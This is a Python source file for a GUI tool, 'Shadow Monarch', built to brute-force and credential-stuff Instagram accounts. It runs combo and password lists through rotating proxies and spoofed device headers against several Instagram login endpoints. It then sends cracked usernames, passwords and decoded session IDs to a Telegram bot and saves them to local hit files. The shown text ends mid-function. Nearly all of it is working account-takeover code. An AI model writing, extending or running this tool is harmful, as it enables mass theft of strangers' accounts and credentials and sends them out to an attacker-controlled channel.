from PyQt5.QtCore import Qt
import requests
import random
import secrets
import uuid
import base64
import re
import ctypes
import hashlib
import string
import sys
import os
import time
import threading
from threading import Thread,Event
import socket
import psutil,queue
from queue import Queue
from colorama import Fore
from PyQt5.QtGui import QPixmap
from PyQt5.QtWidgets import (QApplication, QFileDialog, QMainWindow, QMessageBox, QVBoxLayout, QLabel,
                             QCheckBox, QPushButton, QWidget, QRadioButton, QButtonGroup, QLineEdit, QHBoxLayout)

tool = "shadow monarch"
lock = threading.Lock()
blacklist = []
def RandomStringUpper(n = 10):
    letters = string.ascii_uppercase + '1234567890'
    return ''.join(random.choice(letters) for i in range(n))
def RandomString(n=10):
    letters = string.ascii_lowercase + '1234567890'
    return ''.join(random.choice(letters) for i in range(n))
def RandomStringUpper(n=10):
    letters = string.ascii_uppercase + '1234567890'
    return ''.join(random.choice(letters) for i in range(n))
def RandomStringChars(n=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(n))
def randomStringWithChar(stringLength=10):
    letters = string.ascii_lowercase + '1234567890'
    result = ''.join(random.choice(letters) for i in range(stringLength - 1))
    return RandomStringChars(1) + result
def sendhuntold(Username, Password, State):
  tlg = f"Guess Instagram By Team Champ\nUsername: %s\nPassword: %s\nStatus : %s\n" %(Username, Password, State)
  tlgs = f"Username: %s:Password: %s\n" %(Username, Password)
  requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
  if State == "Good":
    with open('goodcombo.txt','a') as ff:
      ff.write(f'{tlgs}\n')
  elif State == "selfi":
    with open('selficombo.txt','a') as ff:
      ff.write(f'{tlgs}\n')
  elif State == "Secure":
    with open('Secure.txt','a') as ff:
      ff.write(f'{tlgs}\n')
def sendhunt(Username, Password, State,sid):
  tlg = f"Guess Instagram By Team Champ\nUsername: %s\nPassword: %s\nStatus : %s\nSession : %s\n" %(Username, Password, State,sid)
  tlgs = f"Username: %s:Password: %s: Session: %s\n" %(Username, Password,sid)
  requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
  if State == "Good":
    with open('goodcombo.txt','a') as ff:
      ff.write(f'{tlgs}\n')
  elif State == "selfi":
    with open('selficombo.txt','a') as ff:
      ff.write(f'{tlgs}\n')
  elif State == "Secure":
    with open('Secure.txt','a') as ff:
      ff.write(f'{tlgs}\n')
try:
    Settings = open('settings.txt').read()
    token = Settings.split('token:[')[1].split(']')[0]
    ID = Settings.split('ID:[')[1].split(']')[0]
except FileNotFoundError:
    open("settings.txt", "a").write(f'token:[]\nID:[]')
bna = f"""{Fore.RED}
    ____  _               _               
/ ___|| |__   __ _  __| | _____      __
\___ \| '_ \ / _` |/ _` |/ _ \ \ /\ / /
 ___) | | | | (_| | (_| | (_) \ V  V / 
|____/|_| |_|\__,_|\__,_|\___/ \_/\_/  
"""
Title = ctypes.windll.kernel32.SetConsoleTitleW
des = f'[{Fore.LIGHTMAGENTA_EX} +{Fore.RESET} ]'
def Randomis(num):
    rand = 'qwertyuiopasdfghjklzxcvbnm1234567890._'
    return "".join(random.choice(rand) for i in range(num))
class Threading:
    def __init__(self, func):
        self.Target = func
        self.ThreadPool = []
        self.TaskQueue = queue.Queue()
        self.lock = threading.Lock()

    def Threadnum(self, num_threads):
        for _ in range(num_threads):
            thread = threading.Thread(target=self._thread_worker)
            self.ThreadPool.append(thread)

    def _thread_worker(self):
        while True:
            try:
                task = self.TaskQueue.get(timeout=3)  # timeout to allow graceful exit
                task()
                self.TaskQueue.task_done()
            except queue.Empty:
                break

    def AddTasks(self, tasks):
        for task in tasks:
            self.TaskQueue.put(task)

    def Running(self):
        for thread in self.ThreadPool:
            thread.start()

    def Joining(self):
        for thread in self.ThreadPool:
            thread.join()
class Shadowwin(QMainWindow):
    def __init__(self):
        super().__init__()
        self.C = []
        self.q = Queue()
        self.o = Queue()
        self.process_thread = None
        self.stop_event = Event()  # Event to signal stopping

        self.initUI()
        self.initializeShadowwin()
        self.thread_handler = Threading(self.organizer)



    def system(self):
        try:
            num_cores = os.cpu_count() or 4  # Fallback to 4 if unable to determine
            num_threads = min(self.Thrd, num_cores)  # Limiting threads to twice the number of cores
            t = Threading(self.organizer)
            t.Threadnum(num_threads)
            t.AddTasks(self.tasks)  # Assuming `self.tasks` is a list of tasks to be executed
            t.Running()
            t.Joining()
        except Exception as e:
            print(e)
    def initUI(self):
        self.setWindowTitle("Shadow Monarch")
        self.setGeometry(100, 100, 600, 100)  # Adjusted window size

        background_label = QLabel(self)
        pixmap = QPixmap("sung.png")
        background_label.setPixmap(pixmap)
        background_label.setGeometry(0, 0, 800, 400)
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)

        self.layout = QVBoxLayout()

        # Mode selection
        self.mode_label = QLabel("Pick Mode:")
        self.mode_label.setStyleSheet("color: black; font-size: 18px;")
        self.layout.addWidget(self.mode_label)

        self.mode_group = QButtonGroup(self)
        self.combo_mode_cb = QCheckBox("Combo Mode")
        self.combo_mode_cb.setStyleSheet("color: darkred; font-size: 16px;")
        self.random_mode_cb = QCheckBox("Random Mode")
        self.combo_mode_cb.setStyleSheet("color: darkred; font-size: 16px;")
        self.userpass_mode_cb = QCheckBox("User:User Mode")
        self.combo_mode_cb.setStyleSheet("color: darkred; font-size: 16px;")
        self.passuser_mode_cb = QCheckBox("User:Pass Mode")
        self.combo_mode_cb.setStyleSheet("color: darkred; font-size: 16px;")
        self.oneuser_mode_cb = QCheckBox("One User:Password Mode")
        self.combo_mode_cb.setStyleSheet("color: darkred; font-size: 16px;")
        self.onepass_mode_cb = QCheckBox("Users:One Password Mode")
        self.combo_mode_cb.setStyleSheet("color: darkred; font-size: 16px;")

        self.mode_group.addButton(self.combo_mode_cb)
        self.mode_group.addButton(self.random_mode_cb)
        self.mode_group.addButton(self.userpass_mode_cb)
        self.mode_group.addButton(self.passuser_mode_cb)
        self.mode_group.addButton(self.oneuser_mode_cb)
        self.mode_group.addButton(self.onepass_mode_cb)

        self.layout.addWidget(self.combo_mode_cb)
        self.layout.addWidget(self.random_mode_cb)
        self.layout.addWidget(self.userpass_mode_cb)
        self.layout.addWidget(self.passuser_mode_cb)
        self.layout.addWidget(self.oneuser_mode_cb)
        self.layout.addWidget(self.onepass_mode_cb)

        # Checker mode selection
        self.checker_mode_label = QLabel("Pick Checker Mode:")
        self.checker_mode_label.setStyleSheet("color: black; font-size: 18px;")
        self.layout.addWidget(self.checker_mode_label)

        self.checker_mode_group = QButtonGroup(self)

        self.old_api_rb = QRadioButton("Old API")
        self.old_api_rb.setStyleSheet("color: darkred; font-size: 16px;")
        self.new_api_rb = QRadioButton("New API")
        self.new_api_rb.setStyleSheet("color: darkred; font-size: 16px;")
        self.web_api_rb = QRadioButton("Web API")
        self.web_api_rb.setStyleSheet("color: darkred; font-size: 16px;")
        self.checker_mode_group.addButton(self.old_api_rb)
        self.checker_mode_group.addButton(self.new_api_rb)
        self.checker_mode_group.addButton(self.web_api_rb)
        self.layout.addWidget(self.old_api_rb)
        self.layout.addWidget(self.new_api_rb)
        self.layout.addWidget(self.web_api_rb)
        # Thread number input
        self.thread_num_label = QLabel("Thread Number:")
        self.thread_num_label.setStyleSheet("color: black; font-size: 16px;")
        self.layout.addWidget(self.thread_num_label)

        self.thread_num_input = QLineEdit()
        self.thread_num_input.setStyleSheet("color: black; font-size: 16px;")
        self.layout.addWidget(self.thread_num_input)

        # Proxy selection
        self.proxy_label = QLabel("Proxy Options:")
        self.proxy_label.setStyleSheet("color: black; font-size: 18px;")
        self.layout.addWidget(self.proxy_label)

        self.proxy_group = QButtonGroup(self)

        self.use_proxy_cb = QCheckBox("Use Proxy")
        self.use_proxy_cb.setStyleSheet("color: darkred; font-size: 16px;")
        self.free_proxy_cb = QCheckBox("Free Proxy")
        self.free_proxy_cb.setStyleSheet("color: darkred; font-size: 16px;")

        self.proxy_group.addButton(self.use_proxy_cb)
        self.proxy_group.addButton(self.free_proxy_cb)

        self.layout.addWidget(self.use_proxy_cb)
        self.layout.addWidget(self.free_proxy_cb)

        # Dynamic file inputs
        
        # Connect mode selection to show appropriate inputs
        self.combo_mode_cb.toggled.connect(self.handle_file_selection)
        self.random_mode_cb.toggled.connect(self.handle_file_selection)
        self.userpass_mode_cb.toggled.connect(self.handle_file_selection)
        self.passuser_mode_cb.toggled.connect(self.handle_file_selection)
        self.oneuser_mode_cb.toggled.connect(self.handle_file_selection)
        self.onepass_mode_cb.toggled.connect(self.handle_file_selection)
        self.use_proxy_cb.toggled.connect(self.handle_proxy_selection)
        self.free_proxy_cb.toggled.connect(self.handle_proxy_selection)

        # Start button
        self.start_button = QPushButton("Start")
        self.start_button.setStyleSheet("background-color: lightblue; font-size: 16px;")
        self.start_button.clicked.connect(self.start_process)
        self.layout.addWidget(self.start_button)

        self.central_widget.setLayout(self.layout)

        # Disable fullscreen button
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowMaximizeButtonHint)
    def handle_proxy_selection(self):
        if self.use_proxy_cb.isChecked():
            ctypes.windll.user32.MessageBoxW(0, f"Enter", "upload your proxy", 0)
            file_dialog = QFileDialog()
            file_dialog.setFileMode(QFileDialog.ExistingFile)
            if file_dialog.exec_():
                proxy_file = file_dialog.selectedFiles()[0]
                self.load_proxies(proxy_file)
        elif self.free_proxy_cb.isChecked():
            self.C = ["use free proxy"]

    def handle_file_selection(self):
        if self.combo_mode_cb.isChecked():
            ctypes.windll.user32.MessageBoxW(0, f"upload your combo", "Shadow Monarch", 0)
            file_dialog = QFileDialog()
            file_dialog.setFileMode(QFileDialog.ExistingFile)
            if file_dialog.exec_():
                combo_file = file_dialog.selectedFiles()[0]
                self.load_combo(combo_file)
        elif self.random_mode_cb.isChecked():
            ctypes.windll.user32.MessageBoxW(0, f"upload passwords file", "Shadow Monarch", 0)
            file_dialog = QFileDialog()
            file_dialog.setFileMode(QFileDialog.ExistingFile)
            if file_dialog.exec_():
                pass_file = file_dialog.selectedFiles()[0]
                self.load_pass(pass_file)
        elif self.userpass_mode_cb.isChecked():
            ctypes.windll.user32.MessageBoxW(0, f"upload usernames file", "Shadow Monarch", 0)
            file_dialog = QFileDialog()
            file_dialog.setFileMode(QFileDialog.ExistingFile)
            if file_dialog.exec_():
                user_file = file_dialog.selectedFiles()[0]
                self.load_user(user_file)
        elif self.passuser_mode_cb.isChecked():
            ctypes.windll.user32.MessageBoxW(0, f"upload passwords file", "Shadow Monarch", 0)
            file_dialog = QFileDialog()
            file_dialog.setFileMode(QFileDialog.ExistingFile)
            if file_dialog.exec_():
                pass_file = file_dialog.selectedFiles()[0]
                self.load_pass(pass_file)
            ctypes.windll.user32.MessageBoxW(0, f"upload usernames file", "Shadow Monarch", 0)
            file_dialog2 = QFileDialog()
            file_dialog2.setFileMode(QFileDialog.ExistingFile)
            if file_dialog2.exec_():
                user_file = file_dialog2.selectedFiles()[0]
                self.load_user(user_file)
        elif self.oneuser_mode_cb.isChecked():
            self.file_inputs_layout = QVBoxLayout()
            self.username_label = QLabel("Username:")
            self.username_input = QLineEdit()
            self.file_inputs_layout.addWidget(self.username_label)
            self.file_inputs_layout.addWidget(self.username_input)
            ctypes.windll.user32.MessageBoxW(0, f"upload passwords file", "Shadow Monarch", 0)
            file_dialog = QFileDialog()
            file_dialog.setFileMode(QFileDialog.ExistingFile)
            if file_dialog.exec_():
                pass_file = file_dialog.selectedFiles()[0]
                self.load_pass(pass_file)
            self.layout.addLayout(self.file_inputs_layout)
        elif self.onepass_mode_cb.isChecked():
            self.file_inputs_layout = QVBoxLayout()
            self.password_label = QLabel("Password:")
            self.password_input = QLineEdit()
            self.file_inputs_layout.addWidget(self.password_label)
            self.file_inputs_layout.addWidget(self.password_input)
            ctypes.windll.user32.MessageBoxW(0, f"upload usernames file", "Shadow Monarch", 0)
            file_dialog = QFileDialog()
            file_dialog.setFileMode(QFileDialog.ExistingFile)
            if file_dialog.exec_():
                user_file = file_dialog.selectedFiles()[0]
                self.load_user(user_file)
            self.layout.addLayout(self.file_inputs_layout)
    def load_pass(self, pass_file):
        try:
            self.pass_file = pass_file
            with open(pass_file, 'r') as f:
                passwords = f.read().splitlines()
                QMessageBox.information(self, "passwords Loaded", f"Loaded {len(passwords)} passwords.")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to load passwords: {str(e)}")
    def load_user(self, user_file):
        try:
            self.user_file = user_file
            with open(user_file, 'r') as f:
                users = f.read().splitlines()
                QMessageBox.information(self, "users Loaded", f"Loaded {len(users)} users.")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to load users: {str(e)}")
    def load_combo(self, combo_file):
        try:
            self.combofile = combo_file
            with open(combo_file, 'r',encoding="utf-8") as f:
                combo = f.read().splitlines()
                QMessageBox.information(self, "Combo Loaded", f"Loaded {len(combo)} combo.")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to load Combo: {str(e)}")
    def load_proxies(self, file_path):
        try:
            with open(file_path, 'r') as f:
                proxies = f.read().splitlines()
                self.C = proxies
                QMessageBox.information(self, "Proxies Loaded", f"Loaded {len(proxies)} proxies.")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to load proxies: {str(e)}")

    def get_proxy(self):
        Proxy = random.choice(self.C)
        if ":" in Proxy:
            proxy_parts = Proxy.split(":")
            if len(proxy_parts) == 2:
                NewProxies = {'http': f'http://{Proxy}'}
                return NewProxies
            elif len(proxy_parts) == 4:
                NewProxies = {'http': f'http://{Proxy}'}
                return NewProxies
        elif "@" in Proxy:
            NewProxies = {'http': f'http://{Proxy}'}
            return NewProxies
        elif "use free proxy" in Proxy:
            urls = ["https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc",
                    "https://advanced.name/freeproxy/666c32cdb0f6b"]
            url1 = random.choice(urls)
            if url1 == "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc":
                req = requests.get(url1)
                data = req.json()['data']
                proxies = [f"{proxy['ip']}:{proxy['port']}" for proxy in data]
                Proxy = random.choice(proxies)
                NewProxies = {'http': f'http://{Proxy}'}
                return NewProxies
            elif url1 == "https://advanced.name/freeproxy/666c32cdb0f6b":
                req = requests.get(url1)
                proxy_list = req.text
                proxies = proxy_list.strip().split('\n')
                Proxy = random.choice(proxies)
                NewProxies = {'http': f'http://{Proxy}'}
                return NewProxies
        else:
            NewProxies = {'http': f'http://{Proxy}'}
            return NewProxies
    def initializeShadowwin(self):
        self.Att, self.hits, self.secure = 0, 0, 0
        self.go = True
        self.tasks = [self.organizer] * 20
        self.error = 0
        self.notfound = 0
        self.Rl = 0
        self.reqs = requests.Session()
        self.username = ""
        self.password = ""
        self.phonereq = 0
        self.Thrd = 0


    def start_process(self):
        # Get selected mode
        self.modes = []
        if self.combo_mode_cb.isChecked():
            self.modes.append("Combo Mode")
            self.chooses = '2'
        elif self.random_mode_cb.isChecked():
            self.modes.append("Random Mode")
            self.chooses = '1'
        elif self.userpass_mode_cb.isChecked():
            self.modes.append("User:User Mode")
            self.chooses = '3'
        elif self.passuser_mode_cb.isChecked():
            self.modes.append("User:Pass Mode")
            self.chooses = '4'
        elif self.oneuser_mode_cb.isChecked():
            self.modes.append("One User:Password Mode")
            self.chooses = '5'
        elif self.onepass_mode_cb.isChecked():
            self.modes.append("Users:One Password Mode")
            self.chooses = '6'
        
        print(f"Selected Modes: {self.modes}")

        # Get selected checker mode
        if self.old_api_rb.isChecked():
            self.checker_mode = "Old API"
            self.pick = "1"
        elif self.new_api_rb.isChecked():
            self.checker_mode = "New API"
            self.pick = "2"
        elif self.web_api_rb.isChecked():
            self.checker_mode = "Web API"
            self.pick = "3"
        else:
            self.checker_mode = None
            self.pick = None
        
        print(f"Selected Checker Mode: {self.checker_mode}")

        # Get thread number
        try:
            self.Thrd = int(self.thread_num_input.text())
        except ValueError:
            self.Thrd = 0  # Default to 0 or handle error as needed
        
        print(f"Thread Number: {self.Thrd}")

        # Get file inputs based on the mode
        if self.chooses == '2':
            self.filecombo = self.combofile
            try:
                self.combo_file = open(f"{self.filecombo}", "r",encoding="utf-8").read().splitlines()
                if self.combo_file == []:
                    print('Your Combo file is empty ;)')
                else:
                    self.combo_amount = len(self.combo_file)
                    print(f'Combos amount > {self.combo_amount}')
                    for combos in self.combo_file:
                        self.q.put(combos)
            except FileNotFoundError:
                print(f'[{self.filecombo}] not found in the path!')
        elif self.chooses == '3':
            self.fileuser = self.user_file
        elif self.chooses == '4':
            self.fileuser = self.user_file
            self.filepass = self.pass_file
        elif self.chooses == '5':
            self.target = self.username_input.text()
            self.filepass = self.pass_file
        elif self.chooses == '6':
            self.fileuser = self.user_file
            self.zpasspass = self.password_input.text()

        
        Thread(target=self.process_modes).start()
    def process_modes(self):
        # Placeholder for the method that processes the selected modes
        print("Processing modes...")
        print(f"Modes: {self.modes}")
        print(f"Checker Mode: {self.checker_mode}")
        print(f"Thread Number: {self.Thrd}")
        Thread(target=self.rs).start()
        Thread(target=self.system).start()

    
    def rs(self):
        if self.pick == "2":
            while self.go:last = self.Att;time.sleep(1);self.Rs = self.Att - last;self.setWindowTitle(f'Hits : {self.hits:,} |  Secure : {self.secure:,} | Bad User  : {self.notfound}  |  checked : {self.Att} | R/L : {self.Rl} | error : {self.error}')
        elif self.pick == "1":
            while self.go:last = self.Att;time.sleep(1);self.Rs = self.Att - last;self.setWindowTitle(f'Hits : {self.hits:,} |  Secure : {self.secure:,} | selfi  : {self.phonereq} | Bad User  : {self.notfound}  |  checked : {self.Att} | R/L : {self.Rl} | error : {self.error}')
        elif self.pick == "3":
            while self.go:last = self.Att;time.sleep(1);self.Rs = self.Att - last;self.setWindowTitle(f'Hits : {self.hits:,} |  Secure : {self.secure:,} | selfi  : {self.phonereq} |  checked : {self.Att} | R/L : {self.Rl} | error : {self.error}')
    def generateUSER_AGENT(self):
        Devices_menu = ['HUAWEI', 'Xiaomi', 'samsung', 'OnePlus']
        DPIs = [
            '480', '320', '640', '515', '120', '160', '240', '800'
        ]
        randResolution = random.randrange(2, 9) * 180
        lowerResolution = randResolution - 180
        DEVICE_SETTINTS = {
            'system': "Android",
            'Host': "Instagram",
            'manufacturer': f'{random.choice(Devices_menu)}',
            'model': f'{random.choice(Devices_menu)}-{randomStringWithChar(4).upper()}',
            'android_version': random.randint(18, 25),
            'android_release': f'{random.randint(1, 7)}.{random.randint(0, 7)}',
            "cpu": f"{RandomStringChars(2)}{random.randrange(1000, 9999)}",
            'resolution': f'{randResolution}x{lowerResolution}',
            'randomL': f"{RandomString(6)}",
            'dpi': f"{random.choice(DPIs)}"
        }
        return '{Host} 357.1.0.52.100 {system} ({android_version}/{android_release}; {dpi}dpi; {resolution}; {manufacturer}; {model}; {cpu}; {randomL}; en_US)'.format(
            **DEVICE_SETTINTS)
    def gg(self):
        devices = ['iPhone', 'iPhone SE', 'iPhone 8', 'iPhone 8 Plus', 'iPhone X', 'iPhone 11', 'iPhone 12', 'iPhone 13',
                   'iPad', 'iPad Air', 'iPad Pro', 'iPad Mini',
                   'iPod','Samsung Galaxy S8', 'Samsung Galaxy S9', 'Samsung Galaxy S10', 'Samsung Galaxy S20', 'Samsung Galaxy S21',
                   'Samsung Galaxy Note 10', 'Samsung Galaxy Note 20','Google Pixel 3', 'Google Pixel 4', 'Google Pixel 5', 'Google Pixel 6','OnePlus 8', 'OnePlus 9', 'OnePlus Nord','Huawei P30', 'Huawei Mate 40','Sony Xperia 1', 'Sony Xperia 5','Xiaomi Mi 10', 'Xiaomi Mi 11', 'Redmi Note 9','Oppo Find X2', 'Oppo Reno 5','Blackberry Bold 9900', 'Blackberry Curve 9360', 'Blackberry Passport', 'Blackberry KeyOne', 'Blackberry Key2','Nokia 3310', 'Nokia 9 PureView', 'Nokia 7.2','Moto G Power', 'Moto G Stylus', 'Moto E6', 'Moto Razr 2020','LG G8 ThinQ', 'LG V60 ThinQ', 'LG Wing','Amazon Kindle Fire', 'Amazon Fire HD 8', 'Samsung Galaxy Tab S6', 'Samsung Galaxy Tab S7','Linux', 'Windows', 'Windows 10', 'Windows 11', 'macOS', 'macOS Big Sur', 'macOS Monterey', 'Ubuntu', 'Fedora',
                   'Android', 'Android 9', 'Android 10', 'Android 11', 'Android 12',
                   'iOS', 'iOS 14', 'iOS 15',
                   'Blackberry OS', 'Windows Phone']

        versions = [f"{major}_{minor}" for major in range(14, 18) for minor in range(8, 3, -1)]
        device = random.choice(devices)
        return f"Mozilla/5.0 ({device}; CPU {device} OS {random.choice(versions)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
    def cookies(self):
        req = requests.get('https://www.instagram.com/accounts/login/ajax/')
        return {cookie.name: cookie.value for cookie in req.cookies}
    def webhdas(self):
        headers = {
            'Host': 'www.instagram.com',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Ch-Ua': '"Not?A_Brand";v="99", "Chromium";v="130"',
            'Sec-Ch-Ua-Model': '""',
            'Sec-Ch-Ua-Mobile': '?0',
            'X-Ig-App-Id': '936619743392459',
            'X-Fb-Lsd': 'nzpvUIk2W99wLFbzDVj0xa',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Csrftoken': secrets.token_hex(16),
            'Accept-Language': 'en-US,en;q=0.9',
            'X-Bloks-Version-Id': '1fbbc4a302825e0a86a865a39546a4fa9f0b70d85f967657fb4bb32422a40f5c',
            'X-Asbd-Id': '129477',
            'Sec-Ch-Prefers-Color-Scheme': 'light',
            'User-Agent': self.gg(),
            'Sec-Ch-Ua-Platform-Version': '""',
            'Accept': '*/*',
            'Origin': 'https://www.instagram.com',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://www.instagram.com/',
            'Priority': 'u=1, i',
            }
        return headers
    def headers_login(self):
        headers = {}
        headers['User-Agent'] =self.generateUSER_AGENT()
        headers['Host'] = 'i.instagram.com'
        headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        headers['x-fb-http-engine'] = 'Liger'
        headers['Connection'] = 'close'
        return headers
    def checker(self,Username,Password):
        length = 16
        characters = "0123456789abcdef"
        random_string16 = ''.join(secrets.choice(characters) for _ in range(length))
        my_uuid = uuid.uuid4()
        my_uuid_str = str(my_uuid)
        modified_uuid_str = my_uuid_str[:8] + "should_trigger_override_login_success_action" + my_uuid_str[8:]
        data = {
            "params": "{\"client_input_params\":{\"contact_point\":\"" + Username + "\",\"password\":\"#PWD_INSTAGRAM:0:0:" + Password + "\",\"fb_ig_device_id\":[],\"event_flow\":\"login_manual\",\"openid_tokens\":{},\"machine_id\":\"ZG93WAABAAEkJZWHLdW_Dm4nIE9C\",\"family_device_id\":\"\",\"accounts_list\":[],\"try_num\":1,\"login_attempt_count\":1,\"device_id\":\"android-" + random_string16 + "\",\"auth_secure_device_id\":\"\",\"device_emails\":[],\"secure_family_device_id\":\"\",\"event_step\":\"home_page\"},\"server_params\":{\"is_platform_login\":0,\"qe_device_id\":\"\",\"family_device_id\":\"\",\"credential_type\":\"password\",\"waterfall_id\":\"" + modified_uuid_str + "\",\"username_text_input_id\":\"9cze54:46\",\"password_text_input_id\":\"9cze54:47\",\"offline_experiment_group\":\"caa_launch_ig4a_combined_60_percent\",\"INTERNAL__latency_qpl_instance_id\":56600226400306,\"INTERNAL_INFRA_THEME\":\"default\",\"device_id\":\"android-" + random_string16 + "\",\"server_login_source\":\"login\",\"login_source\":\"Login\",\"should_trigger_override_login_success_action\":0,\"ar_event_source\":\"login_home_page\",\"INTERNAL__latency_qpl_marker_id\":36707139}}"
        }
        data["params"] = data["params"].replace("\"family_device_id\":\"\"",
                                                "\"family_device_id\":\"" + str(uuid.uuid4()) + "\"")
        data["params"] = data["params"].replace("\"qe_device_id\":\"\"",
                                                "\"qe_device_id\":\"" + str(uuid.uuid4()) + "\"")
        try:
            req = self.reqs.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',headers = {"Host": "i.instagram.com","X-Ig-App-Locale": "ar_SA","X-Ig-Device-Locale": "ar_SA","X-Ig-Mapped-Locale": "ar_AR","X-Pigeon-Session-Id": f"UFS-{uuid.uuid4()}-0","X-Pigeon-Rawclienttime": "1685026670.130","X-Ig-Bandwidth-Speed-Kbps": "-1.000","X-Ig-Bandwidth-Totalbytes-B": "0","X-Ig-Bandwidth-Totaltime-Ms": "0","X-Bloks-Version-Id": "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb","X-Ig-Www-Claim": "0","X-Bloks-Is-Layout-Rtl": "true","X-Ig-Device-Id": f"{uuid.uuid4()}","X-Ig-Family-Device-Id": f"{uuid.uuid4()}","X-Ig-Android-Id": f"android-{random_string16}","X-Ig-Timezone-Offset": "10800","X-Fb-Connection-Type": "WIFI","X-Ig-Connection-Type": "WIFI","X-Ig-Capabilities": "3brTv10=","X-Ig-App-Id": "567067343352427","Priority": "u=3","User-Agent": f"Instagram 303.0.0.0.59 Android (28/9; 320dpi; 900x1600; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}/{''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; en_GB;)","Accept-Language": "ar-SA, en-US","Ig-Intended-User-Id": "0","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Content-Length": "1957","Accept-Encoding": "gzip, deflate","X-Fb-Http-Engine": "Liger","X-Fb-Client-Ip": "True","X-Fb-Server-Cluster": "True"}, data=data, timeout=10,proxies=self.get_proxy())
            if 'Bearer' in req.text:
                self.hits+=1
                lock.acquire()
                if Username not in blacklist:
                    State = "Good"
                    sendhunt(Username, Password, State,sid)
                    try:
                        sessionid = re.search(r'Bearer IGT:2:(.*?),', req.text).group(1).strip()
                        sessionid = sessionid[:-8]
                        full = base64.b64decode(sessionid).decode('utf-8')
                        if "sessionid" in full:
                            sid = re.search(r'"sessionid":"(.*?)"}', full).group(1).strip()
                            sendhunt(Username, Password, State,sid)
                    except:
                        State = "Good"
                        sendhunt(Username, Password, State,sid)
                lock.release()        
            elif "created_userid" in req.text:
                self.notfound += 1
                self.username = Username
                self.password =  Password
            elif "checkpoint_challenge_required" in req.text:
                self.secure += 1
                self.username = Username
                self.password =  Password
                lock.acquire()
                if Username not in blacklist:
                    State = "Secure"
                    sid = "None"
                    sendhunt(Username, Password, State,sid)
                lock.release()
            elif "two_factor_login" in req.text:
                self.secure += 1
                self.username = Username
                self.password =  Password
                lock.acquire()
                if Username not in blacklist:
                    State = "Two Factor Authentication"
                    sid = "None"
                    sendhunt(Username, Password, State,sid)
                lock.release()
            else:
                self.Att += 1
                self.username = Username
                self.password =  Password
        except Exception as e:
            self.error += 1
            Username = Username
            Password = Password
            self.checker(Username,Password)
    def generate_DeviceId(self , ID):
        volatile_ID = "12345"
        m = hashlib.md5()
        m.update(ID.encode('utf-8') + volatile_ID.encode('utf-8'))
        return 'android-' + m.hexdigest()[:16]
    def generate_uuid(self, ID):
        volatile_ID = "12345"
        m = hashlib.md5()
        m.update(ID.encode('utf-8') + volatile_ID.encode('utf-8'))
        return m.hexdigest()[:16]
    def generate_machine_id(self):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    def checkerweb(self,Username,Password):
        data = {}
        data['enc_password'] = f'#PWD_INSTAGRAM_BROWSER:0:&:{Password}'
        data['caaF2DebugGroup'] = "0"
        data['loginAttemptSubmissionCount'] = "0"
        data['optIntoOneTap'] = "false"
        data['queryParams'] = "{}"
        data['username'] = Username
        
        try:
            req = self.reqs.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',cookies=self.cookies(),headers=self.webhdas(),data=data,timeout=10,proxies= self.get_proxy())
            if '"authenticated":true' in req.text:
                self.hits += 1
                self.username = Username
                self.password =  Password
                lock.acquire()
                if Username not in blacklist:
                    State = "Good"
                    sendhuntold(Username, Password, State)
            elif "two_factor_required" in req.text:
                self.secure += 1
                self.username = Username
                self.password =  Password
                lock.acquire()
                if Username not in blacklist:
                    State = "2FA"
                    sendhuntold(Username, Password, State)
                lock.release()
            elif "'username': 'Instagram User'"in req.text:
                self.phonereq+=1
                self.username = Username
                self.password =  Password
                lock.acquire()
                if Username not in blacklist:
                    State = "selfi"
                    sendhuntold(Username, Password, State)
                lock.release()
            elif '"authenticated":false' in req.text:
                self.Att += 1
                self.username = Username
                self.password =  Password
            elif "checkpoint_required" in req.text:
                self.secure += 1
                self.username = Username
                self.password =  Password
                lock.acquire()
                if Username not in blacklist:
                    State = "Secure"
                    sendhuntold(Username, Password, State)
                lock.release()
            elif 'Please try again' in req.text:
                self.Rl += 1
                self.username = Username
                self.password =  Password
                Username = self.username
                Password = self.password
                self.checker(Username,Password)
        except Exception as e:
            self.error += 1
            Username = Username
            Password = Password
            self.checker(Username,Password)
    def checkerold(self,Username,Password):
        data = {}
        data['guid'] = self.generate_uuid(Username)
        data['enc_password'] = f"#PWD_INSTAGRAM:0:{str(int(time.time()))}:{Password}"
        data['username'] = Username
        data['device_id'] = self.generate_DeviceId(Username)
        data['login_attempt_count'] = '0'
        try:
            req = self.reqs.post('https://i.instagram.com/api/v1/accounts/login/', headers=self.headers_login(), data=data, timeout=10,proxies=self.get_proxy())
            if f"'username': '{Username}'"in req.text:
                self.hits += 1
                self.username = Username
                self.password =  Password
                lock.acquire()
                if Username not in blacklist:
                    State = "Good"
                    sendhuntold(Username, Password, State)
            elif "'two_factor_required': True" in req.text:
                self.secure += 1
                self.username = Username
